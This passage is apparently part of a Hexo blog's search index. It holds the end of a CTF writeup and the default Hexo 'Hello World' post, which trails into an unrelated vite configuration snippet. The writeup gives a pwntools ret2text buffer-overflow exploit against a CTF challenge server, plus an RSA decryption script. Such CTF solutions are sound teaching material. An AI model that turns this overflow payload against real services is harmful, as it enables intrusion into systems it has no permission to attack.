class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> pwn</h1><h2 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text"></a> ret2text</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'ctf.l3hsec.com'</span><span class="token punctuation">,</span><span class="token number">40008</span><span class="token punctuation">)</span>read_flag <span class="token operator">=</span> <span class="token number">0x4007D8</span>ret <span class="token operator">=</span> <span class="token number">0x40089d</span><span class="token comment"># 对齐</span>buf <span class="token operator">=</span> <span class="token string">b'1'</span><span class="token operator">*</span><span class="token number">0x18</span>payload <span class="token operator">=</span> buf <span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_flag<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> CRYPTO</h1><h2 id="factor"><a class="markdownIt-Anchor" href="#factor"></a> factor</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token number">11818626157955143367425397134539988701945901292912494601671841920448950142432716617641692683670072692623351876503702080986305564988430515942372445616530643</span>n <span class="token operator">=</span> <span class="token number">155973472877500551696404049342507495077134952416313340244284845928778400385389548636037403472336378336490931666382159990607516752340206514340009510417187026921007116552045963973163720919596636575029141772459275706505175142195195686881713118383919643653234410908740422880120161538592336383479253864155940629093</span>q<span class="token operator">=</span> n<span class="token operator">//</span>p<span class="token keyword">assert</span> p<span class="token operator">*</span>q <span class="token operator">==</span> ne <span class="token operator">=</span> <span class="token number">0x10001</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token number">32349988441710439726991823014652327949110727303493414402820119679942533399117470462729126720315109509283386087378965374529410971247867614623318967344071216979994926505735379297102144644819487720051553195643392945426400493308569024431403247836671630208580022421678378308476007451938426212992790979191141986943</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/09/14/hello-world/"/>
      <url>/2023/09/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h4 id="打包"><a class="markdownIt-Anchor" href="#打包"></a> 打包<a href="https://yunyoujun.github.io/posts/how-to-write-a-web-component#%E6%89%93%E5%8C%85"></a></h4><p>因为我们尽量想要独立使用，所以需要配置一下 vite，以便在打包时不会将 lit 代码排除。</p><p>ts</p><pre class="line-numbers language-none"><code class="language-none">import &#123; defineConfig &#125; from &#39;vite&#39;&#x2F;&#x2F; https:&#x2F;&#x2F;vitejs.dev&#x2F;config&#x2F;export default defineConfig(&#123;  build: &#123;    lib: &#123;      entry: &#39;src&#x2F;index.ts&#39;,      formats: [&#39;es&#39;],      fileName: format &#x3D;&gt; &#96;index.$&#123;format&#125;.js&#96;,    &#125;,    &#x2F;&#x2F; Because we try to use it independently, we don’t exclude lit.    &#x2F;&#x2F; rollupOptions: &#123;    &#x2F;&#x2F;   external: &#x2F;^lit&#x2F;,    &#x2F;&#x2F; &#125;,  &#125;,&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
